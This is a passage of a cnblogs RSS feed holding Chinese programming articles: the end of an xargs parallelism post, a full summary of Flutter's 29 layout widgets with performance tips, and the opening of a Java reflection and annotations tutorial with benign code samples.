&lt;code&gt;10000000 /mnt/d/test/fs_002
9999999 /mnt/d/test/fs_001
10000000 /mnt/d/test/fs_000
10000000 /mnt/d/test/fs_004
9999999 /mnt/d/test/fs_005
9999999 /mnt/d/test/fs_003
10000000 /mnt/d/test/fs_006
9999999 /mnt/d/test/fs_007&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;不过大多数时候这都不是问题，将结果排序一下就行了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.xargs提升效率的本质是cpu的利用率，因此会有内存、磁盘速度的瓶颈。如果内存小，或者磁盘速度慢(将因为加载数据到内存而长时间处于io等待的睡眠状态)，xargs的并行处理基本无效&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;例如，将上面10G的文本文件放在虚拟机上，机械硬盘，内存2G，将会发现使用xargs并行和普通的命令处理几乎没有差别，因为绝大多数时间都花在了加载文件到内存的io等待上。&lt;/p&gt;
&lt;p&gt;下一篇文章将介绍GNU parallel并行处理工具，它的功能更丰富，效果更强大。&lt;/p&gt;
</description>
<pubDate>Sun, 07 Oct 2018 23:45:00 +0000</pubDate>
<dc:creator>骏马金龙</dc:creator>
<og:description>xargs具有并行处理的能力，在处理大文件时，如果应用得当，将大幅提升效率。 xargs详细内容(全网最详细)：</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/f-ck-need-u/p/9752365.html</dc:identifier>
</item>
<item>
<title>Flutter 布局控件完结篇 - Q吹个大气球Q</title>
<link>http://www.cnblogs.com/holy-loki/p/9735071.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/holy-loki/p/9735071.html</guid>
<description>&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;本文对Flutter的29种布局控件进行了总结分类，讲解一些布局上的优化策略，以及面对具体的布局时，如何去选择控件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;系列文章&quot;&gt;1. 系列文章&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/yang7229693/flutter-study/blob/master/post/3.%20Flutter%20%E5%B8%83%E5%B1%80%E8%AF%A6%E8%A7%A3.md&quot;&gt;Flutter 布局详解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yang7229693/flutter-study/blob/master/post/4.%20Flutter%20%E5%B8%83%E5%B1%80%EF%BC%88%E4%B8%80%EF%BC%89-%20Container%E8%AF%A6%E8%A7%A3.md&quot;&gt;Flutter 布局（一）- Container详解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yang7229693/flutter-study/blob/master/post/5.%20Flutter%20%E5%B8%83%E5%B1%80%EF%BC%88%E4%BA%8C%EF%BC%89-%20Padding%E3%80%81Align%E3%80%81Center%E8%AF%A6%E8%A7%A3.md&quot;&gt;Flutter 布局（二）- Padding、Align、Center详解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yang7229693/flutter-study/blob/master/post/6.%20Flutter%20%E5%B8%83%E5%B1%80%EF%BC%88%E4%B8%89%EF%BC%89-%20FittedBox%E3%80%81AspectRatio%E3%80%81ConstrainedBox%E8%AF%A6%E8%A7%A3.md&quot;&gt;Flutter 布局（三）- FittedBox、AspectRatio、ConstrainedBox详解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yang7229693/flutter-study/blob/master/post/8.%20Flutter%20%E5%B8%83%E5%B1%80%EF%BC%88%E5%9B%9B%EF%BC%89-%20Baseline%E3%80%81FractionallySizedBox%E3%80%81IntrinsicHeight%E3%80%81IntrinsicWidth%E8%AF%A6%E8%A7%A3.md&quot;&gt;Flutter 布局（四）- Baseline、FractionallySizedBox、IntrinsicHeight、IntrinsicWidth详解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yang7229693/flutter-study/blob/master/post/9.%20Flutter%20%E5%B8%83%E5%B1%80%EF%BC%88%E4%BA%94%EF%BC%89-%20LimitedBox%E3%80%81Offstage%E3%80%81OverflowBox%E3%80%81SizedBox%E8%AF%A6%E8%A7%A3.md&quot;&gt;Flutter 布局（五）- LimitedBox、Offstage、OverflowBox、SizedBox详解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yang7229693/flutter-study/blob/master/post/10.%20Flutter%20%E5%B8%83%E5%B1%80%EF%BC%88%E5%85%AD%EF%BC%89-%20SizedOverflowBox%E3%80%81Transform%E3%80%81CustomSingleChildLayout%E8%AF%A6%E8%A7%A3.md&quot;&gt;Flutter 布局（六）- SizedOverflowBox、Transform、CustomSingleChildLayout详解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yang7229693/flutter-study/blob/master/post/11.%20Flutter%20%E5%B8%83%E5%B1%80%EF%BC%88%E4%B8%83%EF%BC%89-%20Row%E3%80%81Column%E8%AF%A6%E8%A7%A3.md&quot;&gt;Flutter 布局（七）- Row、Column详解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yang7229693/flutter-study/blob/master/post/12.%20Flutter%20%E5%B8%83%E5%B1%80%EF%BC%88%E5%85%AB%EF%BC%89-%20Stack%E3%80%81IndexedStack%E3%80%81GridView%E8%AF%A6%E8%A7%A3.md&quot;&gt;Flutter 布局（八）- Stack、IndexedStack、GridView详解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yang7229693/flutter-study/blob/master/post/13.%20Flutter%20%E5%B8%83%E5%B1%80%EF%BC%88%E4%B9%9D%EF%BC%89-%20Flow%E3%80%81Table%E3%80%81Wrap%E8%AF%A6%E8%A7%A3.md&quot;&gt;Flutter 布局（九）- Flow、Table、Wrap详解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/yang7229693/flutter-study/blob/master/post/14.%20Flutter%20%E5%B8%83%E5%B1%80%EF%BC%88%E5%8D%81%EF%BC%89-%20ListBody%E3%80%81ListView%E3%80%81CustomMultiChildLayout%E8%AF%A6%E8%A7%A3.md&quot;&gt;Flutter 布局（十）- ListBody、ListView、CustomMultiChildLayout详解&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;乱侃&quot;&gt;1.1 乱侃&lt;/h3&gt;
&lt;p&gt;前前后后也算是拖拖拉拉的写了一些Flutter的文章，写的也都比较粗略。最近工作调动，内部换了部门，一顿瞎忙活，也打乱了原本的分享计划。&lt;/p&gt;
&lt;p&gt;从我最开始接触Flutter到现在，差不多四个多月了。在这段时间里面，Flutter也发布了Release Preview版本。各个技术网站本着先拨头筹的心态，推广了几波，国内的人气跟着也起来了不少。全世界Flutter开发人员中，国内从业者占据了很大的比重，这个现象本身并不能说明什么，不过可以反映一点，有商业诉求吧。当然观望的还是占绝大部分，除了一些个人开发者爱折腾外，也就是一些大的业务成熟到不能再成熟的团队，内部消化人员去折腾这个了。&lt;/p&gt;
&lt;p&gt;插个题外话，有感于最近的工作变动，这段时间胡思乱想的比较多。一门技术对程序员来说到底意味着什么？如果不需要再为生计奔波，是否还会对目前已上手的技术感兴趣？如果你现在的项目所需要的技术，对你个人而言毫无加成，只会浪费你的时间，让你在已有的技术栈上渐行渐远，你是否还会参与这个项目。只有极少数人会遇上逆天改命的项目，不管参与什么项目，技术人员的立身之本始终是技术（高管或者打算换行的除外），技术的选型，除去时间效率后续维护等普适性的考虑要素外，排在第一位的始终应该是对自身的提高，扯的有些远了哈。&lt;/p&gt;
&lt;h3 id=&quot;本质&quot;&gt;1.2 本质&lt;/h3&gt;
&lt;p&gt;我数了一下我文章总结过的布局控件，总共有29种。乍看会觉得真鸡毛的多，不乍看，也会觉得鸡毛的真多。为什么其他的移动平台没有这么多布局控件呢？其实不然，其他平台没有这么细分。&lt;/p&gt;
&lt;p&gt;以Android平台为例，最基础的几种布局例如LinearLayout、RelativeLayout、ConstraintLayout等等。很多Flutter的控件，对于Android来说，仅仅是一个属性的设置问题。&lt;/p&gt;
&lt;p&gt;再往上看，iOS、Android、Web这些平台的布局，其实最基本就那几种，线性布局、绝对布局、相对布局等等。Flutter也逃不出这些，那为什么Flutter现在有这么多布局控件呢？&lt;/p&gt;
&lt;ul readability=&quot;3.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;第一点，之前文章介绍过的，Flutter的理念是&lt;code&gt;万物皆为widget&lt;/code&gt;。这和Flutter的实现机制有关，而不是因为它在布局上有什么特殊性，这也是最主要的一点。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;第二点，我觉得是因为这是Flutter的初期，如果有经历过一个技术的完整发展周期，就会明白，前期只是提供各种零件，只有商业支撑或者人员支撑足够的时候，才会去优化零件。而现在就是这么一种资源不足的状态。各种组件可以合并的有很多，底层的实现机制不会变，只是再加一层即可，这也是可以造轮子的地方，例如封装一套适用于Android、iOS或者Web人员的控件库等。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;第三点，跟初期相关，一套新的技术，各种东西不可能一下子全想明白，路总是走着走着才发现走歪了，就像一些控件，可能一些地方合适，但是一些新的地方又不太合适，所以就再造一个，所以有些控件看起来功能十分相似。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;说了这么多，我其实就想说明一点，Flutter现在还只是处在社会发展的初级阶段，还处在温饱问题都解决不了的状态，想达到小康还需要很长的一段路要走。&lt;/p&gt;
&lt;h2 id=&quot;单节点控件&quot;&gt;2. 单节点控件&lt;/h2&gt;
&lt;p&gt;单节点控件，顾名思义就是只有一个节点的布局控件。这种控件有多少个呢，我之前文章总结过的有18种，现阶段还是不排除增加的可能，哈哈。&lt;/p&gt;
&lt;h3 id=&quot;分类&quot;&gt;2.1 分类&lt;/h3&gt;
&lt;p&gt;在这小节里，我尝试从多个维度去对这些控件进行分类，希望这样可以帮助大家理解。&lt;/p&gt;
&lt;h4 id=&quot;按照继承划分&quot;&gt;2.1.1 按照继承划分&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;http://whysodiao.com/images/Flutter-Single-Widget.jpg&quot; alt=&quot;Flutter单节点布局控件继承分类&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上面是这18种控件的父节点层面的继承关系，唯一不同的一个控件就是Container。所以按照是否继承自SingleChildRenderObjectWidget的分类如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;继承自StatelessWidget的控件，有Container。&lt;/li&gt;
&lt;li&gt;继承自SingleChildRenderObjectWidget的控件，有Padding、Align、Center、FittedBox、AspectRatio、ConstrainedBox、Baseline、FractionallySizedBox、IntrinsicHeight、IntrinsicWidth、LimitedBox、Offstage、OverflowBox、SizedBox、SizedOverflowBox、Transform、CustomSingleChildLayout。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Container是一个组合控件，不是一个基础控件，这点从继承关系就可以看出来。&lt;/p&gt;
&lt;h4 id=&quot;按照功能是否单一划分&quot;&gt;2.1.2 按照功能是否单一划分&lt;/h4&gt;
&lt;p&gt;分类如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;功能不单一的控件，Container、Transform、FittedBox、SizedOverflowBox。&lt;/li&gt;
&lt;li&gt;功能单一的控件，有Padding、Align、Center、AspectRatio、ConstrainedBox、Baseline、FractionallySizedBox、IntrinsicHeight、IntrinsicWidth、LimitedBox、Offstage、OverflowBox、SizedBox、CustomSingleChildLayout。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;先在此处小结一下，可以看出Container的特殊之处了吧，为什么Container这么特殊了。这个特殊要从两个层面去看。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;对于Flutter而言，Container是特殊的，因为它不是功能单一的控件，是一个组合的控件，所以它相对于Flutter是特殊的。&lt;/li&gt;
&lt;li&gt;对于移动端开发者而言，它不是特殊的，因为很多UI都是一些基础功能组合的，这样能让开发者更方便的使用。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;那能得出什么结论呢？我个人觉得，Container这种组合的控件会越来越多，也会有个人开发者去开发这种通用型的组合控件，这是一个大趋势，是Flutter走向易用的一小步。&lt;/p&gt;
&lt;h4 id=&quot;按照功能划分&quot;&gt;2.1.3 按照功能划分&lt;/h4&gt;
&lt;p&gt;在此处我按照定位、尺寸、绘制三部分来尝试着去做功能的划分，当然这个划分并不绝对，仁者见仁吧。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;定位控件：Container、Align、Center、FittedBox、Baseline、Transform。&lt;/li&gt;
&lt;li&gt;尺寸控件：Container、FittedBox、AspectRatio、ConstrainedBox、FractionallySizedBox、IntrinsicHeight、IntrinsicWidth、LimitedBox、SizedBox、SizedOverflowBox。&lt;/li&gt;
&lt;li&gt;绘制控件：Container、Padding、Offstage、OverflowBox、SizedOverflowBox、Transform。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;有一个控件并没有归到这三类中，CustomSingleChildLayout可以自定义实现，此处不做分类。Baseline可以把它放到绘制里面去，此处我按照调节文字的位置去做分类，这个大家知道就行，并不是说只能这么划分。&lt;/p&gt;
&lt;p&gt;对于绘制控件，其实分的有些杂，我把显示相关的都归到这里，例如是否显示、内边距、是否超出显示以及变形等等。&lt;/p&gt;
&lt;p&gt;每一种大类，Flutter都提供了多种控件。经过这么划分，可以看出很多控件功能的交叉，很多时候一个属性的事情，Flutter还是分出了一个控件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://whysodiao.com/images/Flutter-Single-Child-Category.jpg&quot; alt=&quot;Flutter单节点布局控件功能分类&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;使用&quot;&gt;2.2 使用&lt;/h3&gt;
&lt;p&gt;单节点控件虽然这么多，但是大部分不会挨个去尝试。对于大部分人而言，都是佛系的用法，一个控件能够使用，就一直用到死。&lt;/p&gt;
&lt;p&gt;在布局上，大方向还是不停的&lt;code&gt;拆&lt;/code&gt;，把一张设计图，拆成一棵树，每个节点根据需要，选择合适的控件，然后从根部开始不停嵌套，布局就完成了。&lt;/p&gt;
&lt;h3 id=&quot;控件的选择&quot;&gt;2.3 控件的选择&lt;/h3&gt;
&lt;p&gt;控件种类繁多，真正使用的时候该如何去选择呢？有万金油的做法，不管啥都用Container，这也是很多初接触的人经常干的方式。这么做的确可以按照设计图把布局给实现了，但是会涉及到一些性能上的问题。&lt;/p&gt;
&lt;p&gt;控件的选择，&lt;code&gt;按照控件最小功能的标准去选择&lt;/code&gt;。例如需要将子节点居中，可以使用Container设置alignment的方式，也可以使用Center。但是从功能上，Center是最小级别的，因此选择它的话，额外的开销会最小。&lt;/p&gt;
&lt;p&gt;将UI实现了，这只是最基本的，当达到这一步了，应该更多的去思考，如何更好的布局，使得性能更高。&lt;/p&gt;
&lt;h2 id=&quot;多节点控件&quot;&gt;3. 多节点控件&lt;/h2&gt;
&lt;p&gt;多节点控件的种类就少了一些，虽然也有11种，但是功能和场景多了，所以选择上反而会简单一些。&lt;/p&gt;
&lt;h3 id=&quot;分类-1&quot;&gt;3.1 分类&lt;/h3&gt;
&lt;p&gt;多节点控件内部实现比单节点控件复杂的多，会从继承以及功能两个方向去做分类。&lt;/p&gt;
&lt;h4 id=&quot;按照继承划分-1&quot;&gt;3.1.1 按照继承划分&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;http://whysodiao.com/images/Flutter-Multi-Widget.jpg&quot; alt=&quot;Flutter多节点布局控件继承分类&quot;/&gt;&lt;/p&gt;
&lt;p&gt;从上图可以看出，多节点布局控件基本上可以分为三条线&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;继承自BoxScrollView的控件，有GridView以及ListView；&lt;/li&gt;
&lt;li&gt;继承自MultiChildRenderObjectWidget的控件，有Row、Column、Flow、Wrap、Stack、IndexedStack、ListBody、CustomMultiChildLayout八种；&lt;/li&gt;
&lt;li&gt;继承自RenderObjectWidget的控件，有Table一种。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;之前介绍过，GridView和ListView的实现都是非常相似的，基本上就是silvers只包含一个Sliver（GridView为SilverGrid、ListVIew为SliverList）的CustomScrollView。 这也是为啥这两元素都继承自BoxScrollView的缘故。&lt;/p&gt;
&lt;p&gt;MultiChildRenderObjectWidget类，官方解读如下&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;A superclass for RenderObjectWidgets that configure RenderObject subclasses&lt;br/&gt;that have a single list of children.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;它只是一个含有单一list子节点的控件，为什么Table不需要继承自MultiChildRenderObjectWidget呢？&lt;/p&gt;
&lt;p&gt;这是因为Table的子节点是二维（横竖）的，而MultiChildRenderObjectWidget提供的是一个一维的子节点管理，所以必须继承自RenderObjectWidget。知道了这些过后，对继承关系的理解会有更好的帮助。&lt;/p&gt;
&lt;h4 id=&quot;按照功能划分-1&quot;&gt;3.1.2 按照功能划分&lt;/h4&gt;
&lt;p&gt;这个对于多节点布局控件来说，还是比较难以划分的，笔者试着做了如下划分：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;列表：GridView、ListView；&lt;/li&gt;
&lt;li&gt;单列单行或者多列多行：Row、Column、Flow、Wrap、ListBody、Table；&lt;/li&gt;
&lt;li&gt;显示位置相关：Stack、IndexedStack、CustomMultiChildLayout。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;个人觉得这种分类方式不是特别的稳妥，但还是写下来了，请大家仁者见仁。&lt;/p&gt;
&lt;p&gt;GridView和ListView分为一类，一个是因为其实现非常的相似，另一个原因是这两个控件内容区域可以无限，不像其他控件的内容区域都是固定的，因此将这两个划分为一类。&lt;/p&gt;
&lt;p&gt;关于单列单行多列多行的，也并不是说很严格的，Row、Column、Table、ListBody可能会遵守这种划分，Flow以及Wrap则是近似的多列多行。这种划分绝对不是绝对的，只是个人的一种考量划分方式。&lt;/p&gt;
&lt;h3 id=&quot;使用-1&quot;&gt;3.2 使用&lt;/h3&gt;
&lt;p&gt;多节点控件种类较少，而且功能重叠的很少，因此在使用上来说，还是简单一些。比较常用的GridView、ListView、Row、Column、Stack，这几个控件基本上涵盖了大部分的布局了。&lt;/p&gt;
&lt;h3 id=&quot;控件的选择-1&quot;&gt;3.3 控件的选择&lt;/h3&gt;
&lt;p&gt;多节点控件功能重叠的较少，因此选择上，不会存在太多模凌两可的问题，需要什么使用什么即可。&lt;/p&gt;
&lt;h2 id=&quot;性能优化&quot;&gt;4. 性能优化&lt;/h2&gt;
&lt;p&gt;性能优化这块儿，可能仁者见仁，并没有一个统一的说法，毕竟现在Flutter各方面都还不完善。但是，大方向还是有的，尽量使用功能集更小的控件，这个对于渲染效率上还是有所帮助的。&lt;/p&gt;
&lt;h3 id=&quot;优化&quot;&gt;4.1 优化&lt;/h3&gt;
&lt;p&gt;在这里我试着去列举一些，并不一定都正确。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;对于单节点控件，如果一个布局多个控件都可以完成，则使用功能最小的，可以参照上面控件分类中的功能划分来做取舍；&lt;/li&gt;
&lt;li&gt;对于多节点控件，如果单节点控件满足需求的话，则去使用单节点控件进行布局；&lt;/li&gt;
&lt;li&gt;对于ListView，标准构造函数适用于条目比较少的情况，如果条目较多的话，尽量使用ListView.builder；&lt;/li&gt;
&lt;li&gt;对于GridView，如果需要展示大量的数据的话，尽量使用GridView.builder；&lt;/li&gt;
&lt;li&gt;Flow、Wrap、Row、Column四个控件，单纯论效率的话，Flow是最高效的，但是使用起来是最复杂的；&lt;/li&gt;
&lt;li&gt;如果是单行或者单列的话，Row、Column比Table更高效；&lt;/li&gt;
&lt;li&gt;Stack和CustomMultiChildLayout如果同时满足需求的话，CustomMultiChildLayout在某些时候效率会更高一些，但是取决于Delegate的实现，且使用起来更加的复杂；&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;上面所列的比较杂，但是归纳起来，无非这几点：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;功能越少的控件，效率越高；&lt;/li&gt;
&lt;li&gt;ListView以及GridView的builder构造函数效率更高；&lt;/li&gt;
&lt;li&gt;实现起来比较复杂的控件，效率一般会更高。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;选择&quot;&gt;4.2 选择&lt;/h3&gt;
&lt;p&gt;控件的选择，个人觉得把握大方向就够了。如果时间紧急，以实现效率最优先，如果时间充裕的话，可以按照一些优化细则，去做一些选择。单纯控件层面，带来性能上的改进毕竟十分有限。&lt;/p&gt;
&lt;h2 id=&quot;实战&quot;&gt;5. 实战&lt;/h2&gt;
&lt;p&gt;首先看一下实际的效果图，这个是之前做工程中，比较复杂的一个界面吧，就算放到native上看，也是比较复杂的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://whysodiao.com/images/Flutter-Complex-Sample.png&quot; alt=&quot;Flutter复杂页面样例&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这个页面中有不少自定义控件，例如日期选择、进度等。整体看着复杂，实现起来其实也还好。关于如何布局拆解，之前文章有过介绍，在这里不再阐述，诀窍就是一个字----拆。&lt;/p&gt;
&lt;h3 id=&quot;关于自定义控件&quot;&gt;5.1 关于自定义控件&lt;/h3&gt;
&lt;p&gt;自定义控件一般都是继承自StatelessWidget、StatefulWidget。也有一些特殊的，例如上面的进度控件，直接使用Canvas画的。&lt;/p&gt;
&lt;p&gt;对于需要更新状态的，一般都是继承自StatefulWidget，对于不需要更新状态的，使用StatelessWidget即可，能够使用StatelessWidget的时候，也尽量使用它，StatefulWidget在页面更新的时候，会存在额外的开销。&lt;/p&gt;
&lt;p&gt;Flutter的自定义控件，写起来可能会比原生的更简单，它更多的是一些基础控件的组合使用，而很少涉及到底层的一些重写。&lt;/p&gt;
&lt;h3 id=&quot;关于生命周期&quot;&gt;5.2 关于生命周期&lt;/h3&gt;
&lt;p&gt;这是很蛋疼的一个问题，一个纯Flutter的App，类似于Android中的单Activity应用。某个具体的页面就算去监听native层的生命周期，也仅仅是获取到base activity的，而无法获取到页面层级的。&lt;/p&gt;
&lt;h3 id=&quot;感想&quot;&gt;5.3 感想&lt;/h3&gt;
&lt;p&gt;Flutter如果轮子足够的话，还是非常吸引人的，在熟悉了这些基础组件过后，编写起来，速度会非常快。自定义控件的实现，也比较简单。但是，性能方面，还是存在比较大的问题，复杂页面首次载入，速度还是比较慢。对于高端机型来说，整体流畅度很不错，堪比原生的app，低端机型，表现就比较捉急吧。整体来说，Flutter表现还是挺不错的，可以上手试试，把玩把玩吧。就是写起来，写着写着就觉得恶心，是真的恶心的那种恶心，看着各种嵌套标签，感觉被降维成了web开发。&lt;/p&gt;
&lt;p&gt;近期看到一些基于Flutter的自动布局解决方案，之前也有想过，完全可以基于Flutter做出布局的工具，仅仅是拖拽就可以实现完成度非常高的布局页面。也得益于Flutter本身的思想和实现机制，web方面的很多东西，个人觉得都可以借鉴到Flutter上。单纯从UI层来说，Flutter确实有自己独特的地方。如果Flutter在最开始，就仅仅是一套跨平台的UI的话，可能更容易被人们接受吧。&lt;/p&gt;
&lt;p&gt;前几天看了官方的camera插件，还是挺蛋疼的，对于国内的Android端来说，直接拿来商用几乎是不可能的。插件基于camera2去实现，国内大部分厂商对于camera2的支持很差，一些很容易复现的crash也没有去解决。&lt;/p&gt;
&lt;p&gt;如果决定在现有项目中使用Flutter，则需要做好埋坑造轮子的觉悟。如果人力紧缺的话，不应该在这上面去投入，人力富余的时候，可以投入人力跟进研究，让业界觉得你们很棒很前沿。&lt;/p&gt;
&lt;h2 id=&quot;后话&quot;&gt;6. 后话&lt;/h2&gt;
&lt;p&gt;笔者建了一个Flutter学习相关的项目，&lt;a href=&quot;https://github.com/yang7229693/flutter-study&quot;&gt;Github地址&lt;/a&gt;，里面包含了笔者写的关于Flutter学习相关的一些文章，会定期更新，也会上传一些学习Demo，欢迎大家关注。&lt;/p&gt;
&lt;h2 id=&quot;参考&quot;&gt;7. 参考&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/yang7229693/flutter-study/blob/master/post/3.%20Flutter%20%E5%B8%83%E5%B1%80%E8%AF%A6%E8%A7%A3.md&quot;&gt;Flutter 布局详解&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</description>
<pubDate>Sun, 07 Oct 2018 23:17:00 +0000</pubDate>
<dc:creator>Q吹个大气球Q</dc:creator>
<og:description>本文对Flutter的29种布局控件进行了总结分类，讲解一些布局上的优化策略，以及面对具体的布局时，如何去选择控件。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/holy-loki/p/9735071.html</dc:identifier>
</item>
<item>
<title>反射、注解和动态代理 - yhthu</title>
<link>http://www.cnblogs.com/younghao/p/9751566.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/younghao/p/9751566.html</guid>
<description>&lt;p&gt;反射是指计算机程序在运行时访问、检测和修改它本身状态或行为的一种能力，是一种元编程语言特性，有很多语言都提供了对反射机制的支持，它使程序能够编写程序。Java的反射机制使得Java能够动态的获取类的信息和调用对象的方法。&lt;/p&gt;
&lt;h2 id=&quot;一java反射机制及基本用法&quot;&gt;一、Java反射机制及基本用法&lt;/h2&gt;
&lt;p&gt;在Java中，Class（类类型）是反射编程的起点，代表运行时类型信息（RTTI，Run-Time Type Identification）。java.lang.reflect包含了Java支持反射的主要组件，如Constructor、Method和Field等，分别表示类的构造器、方法和域，它们的关系如下图所示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/3923557-fadce88e244acb57.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/500&quot; alt=&quot;Java反射机制主要组件&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Constructor和Method与Field的区别在于前者继承自抽象类Executable，是可以在运行时动态调用的，而Field仅仅具备可访问的特性，且默认为不可访问。下面了解下它们的基本用法：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/3923557-711bcb9dbdec0b48.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/860&quot; alt=&quot;Java反射类及核心方法&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;获取Class对象有三种方式，Class.forName适合于已知类的全路径名，典型应用如加载JDBC驱动。对同一个类，不同方式获得的Class对象是相同的。&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;// 1. 采用Class.forName获取类的Class对象
Class clazz0 = Class.forName(&quot;com.yhthu.java.ClassTest&quot;);
System.out.println(&quot;clazz0:&quot; + clazz0);
// 2. 采用.class方法获取类的Class对象
Class clazz1 = ClassTest.class;
System.out.println(&quot;clazz1:&quot; + clazz1);
// 3. 采用getClass方法获取类的Class对象
ClassTest classTest = new ClassTest();
Class clazz2 = classTest.getClass();
System.out.println(&quot;clazz2:&quot; + clazz2);
// 4. 判断Class对象是否相同
System.out.println(&quot;Class对象是否相同:&quot; + ((clazz0.equals(clazz1)) &amp;amp;&amp;amp; (clazz1.equals(clazz2))));&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;注意：三种方式获取的Class对象相同的前提是使用了相同的类加载器，比如上述代码中默认采用应用程序类加载器（sun.misc.Launcher$AppClassLoader）。不同类加载器加载的同一个类，也会获取不同的Class对象：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code&gt;// 自定义类加载器
ClassLoader myLoader = new ClassLoader() {
    @Override
    public Class&amp;lt;?&amp;gt; loadClass(String name) throws ClassNotFoundException {
        try {
            String fileName = name.substring(name.lastIndexOf(&quot;.&quot;) + 1) + &quot;.class&quot;;
            InputStream is = getClass().getResourceAsStream(fileName);
            if (is == null) {
                return super.loadClass(name);
            }
            byte[] b = new byte[is.available()];
            is.read(b);
            return defineClass(name, b, 0, b.length);
        } catch (IOException e) {
            throw new ClassNotFoundException(name);
        }
    }
};
// 采用自定义类加载器加载
Class clazz3 = Class.forName(&quot;com.yhthu.java.ClassTest&quot;, true, myLoader);
// clazz0与clazz3并不相同
System.out.println(&quot;Class对象是否相同:&quot; + clazz0.equals(clazz3));&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;通过Class的getDeclaredXxxx和getXxx方法获取构造器、方法和域对象，两者的区别在于前者返回的是当前Class对象申明的构造器、方法和域，包含修饰符为private的；后者只返回修饰符为public的构造器、方法和域，但包含从基类中继承的。&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;// 返回申明为public的方法，包含从基类中继承的
for (Method method: String.class.getMethods()) {
    System.out.println(method.getName());
}
// 返回当前类申明的所有方法，包含private的
for (Method method: String.class.getDeclaredMethods()) {
    System.out.println(method.getName());
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;通过Class的newInstance方法和Constructor的newInstance方法方法均可新建类型为Class的对象，通过Method的invoke方法可以在运行时动态调用该方法，通过Field的set方法可以在运行时动态改变域的值，但需要首先设置其为可访问（setAccessible）。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;二-注解&quot;&gt;二、 注解&lt;/h2&gt;
&lt;p&gt;注解（Annontation）是Java5引入的一种代码辅助工具，它的核心作用是对类、方法、变量、参数和包进行标注，通过反射来访问这些标注信息，以此在运行时改变所注解对象的行为。Java中的注解由内置注解和元注解组成。内置注解主要包括：&lt;/p&gt;
